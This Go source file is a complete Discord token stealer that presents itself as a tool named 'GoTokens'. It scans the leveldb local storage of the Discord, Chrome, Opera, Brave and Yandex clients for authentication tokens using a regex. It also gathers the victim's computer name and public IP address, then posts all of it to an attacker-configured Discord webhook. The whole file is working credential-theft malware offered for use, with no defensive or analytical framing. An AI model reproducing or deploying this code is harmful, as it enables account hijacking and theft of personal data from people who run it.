package main

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

// Settings
var webhook string = "webhook url"
var username string = "GoTokens | (by github.com/kcybe)"
var avatar_url string = "https://camo.githubusercontent.com/19701f26341abb91039ce91da2e1222c2ce8c8c12954ca7f35a6365b79ebe2df/68747470733a2f2f736563757265676f2e696f2f696d672f676f7365632e706e67"

// Getting the public IP address by http request
func getIPAddress() string {
	resp, err := http.Get("https://ip4.seeip.org/")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	return string(body)
}

// Getting the computer name from the environment
func getComputerName() string { 
	env := os.Environ()
	for _, item := range env { // For info in environment
		if strings.Contains(item, "COMPUTERNAME") { // If the Info contains the word "COMPUTERNAME"
			computerName := strings.Split(item, "=") // Splitting the info to two 
			return computerName[1] // Returning only the needed data
		} else { // If the info does not contain the word asked for it'll skip it
			continue
		}
	}
	return "Not Found"
}

// Getting the local folder path from the environment
func getLocal() string { 
	env := os.Environ()
	for _, item := range env {
		if strings.Contains(item, "LOCALAPPDATA") {
			local := strings.Split(item, "=")
			return local[1]
		} else {
			continue
		}
	}
	return "Not Found"
}

// Getting the roaming folder path from the environment
func getRoaming() string { 
	env := os.Environ()
	for _, item := range env {
		if strings.Contains(item, "APPDATA") {
			appdata := strings.Split(item, "=")
			return appdata[1]
		} else {
			continue
		}
	}
	return "Not Found"
}

// Fetching the tokens from the given path
func getTokens(path string) []string {

	var tokens []string

	path += "\\Local Storage\\leveldb\\" // Adding to the path given
	
	files, err := ioutil.ReadDir(path) // Getting all the files in directory

	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files { // For file in files
		if filepath.Ext(f.Name()) == ".ldb" || filepath.Ext(f.Name()) == ".log" { // If the file has the extention of..
			content, err := ioutil.ReadFile( path + f.Name() ) // Reading the file
			if err != nil { // Catching error if there is
				log.Fatal(err)
			}
			r, _ := regexp.Compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}") // Searching for tokens with regex
			tokens = append (tokens, r.FindString(string(content))) // Appending the list of tokens
		} else { // Else if there are no tokens to fetch..
			continue
		}
	}
	return tokens
}

func main() {
	// Setting all the data together
	ip := getIPAddress()
	computerName := getComputerName()
	local := getLocal()
	roaming := getRoaming()
	var timenow = time.Now().String()
	message := "```ini\n[ Go Tokens | Webhook ]\n" // Discord message title

	var paths = map[string]string { // All the discord paths could be existed
		"Discord": roaming + "\\Discord",
		"Discord Canary": roaming + "\\discordcanary",
		"Discord PTB": roaming + "\\discordptb",
		"Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
		"Opera": roaming + "\\Opera Software\\Opera Stable",
		"Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
		"Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
	}

	for _, path := range paths { // For path in paths
		if _, err := os.Stat(path); os.IsNotExist(err) { // If path does not exists...
			continue
		} else { // Else if path exists
			message += "\n" + path + ":\n" // Adding the path to the message
			tokens := getTokens(path) // Getting all the tokens from the path
			if len(tokens) > 0 { // If the list of tokens is greater then 0
				for _, token := range tokens { // For token in the list of tokens
					if len(token) > 1 { // If the token length is greater than 1 (more than one character)
						message += token + "\n" // Adding the token to the message
					} else { // Else if the token length is less than one (null)
						continue
					}
				}	
			} else { // Else If the tokens list is less than 1 (null = not tokens found)
				message += "Tokens Not Found" 
			}
		}
	}

	message += "\nMachine Name: " + computerName + "\nIP Address: " + ip + "\n;Time: " + timenow + "```" // Adding more info about the machine to the message

	type Webhook struct { // Structing the Webhook type for http request
		Username  string  `json:"username"`
		AvatarURL string  `json:"avatar_url"`
		Content   string  `json:"content"`
	}

	payload := Webhook{ // Putting together all the info of the webhook to the Webhook struct
		Username: 	username,
		AvatarURL: avatar_url,
		Content: 	message,
	}
	
	client := &http.Client{} // Defining http client

	webhookData, err := json.Marshal(payload) // Making json data from the payload for the http request 
	if err != nil {
		log.Fatal(err)
	}

	req, err := http.NewRequest("POST", webhook, bytes.NewBuffer(webhookData)) // Defining the request, passing in "POST" (Post Request), webhook url defined in settings, the jsoned data
	req.Header.Add("Content-Type", "application/json") // Adding header of content-type accepted
	if err != nil {
		log.Fatal(err)
	}
	webhookPost, err := client.Do(req) // Making the POST request
	if err != nil {
		log.Fatal(err)
	}
	if webhookPost.StatusCode == 204 { // If the webhook POST request is valid
		log.Fatalf("true")
	} else {
		log.Fatalf("false")
	}
}
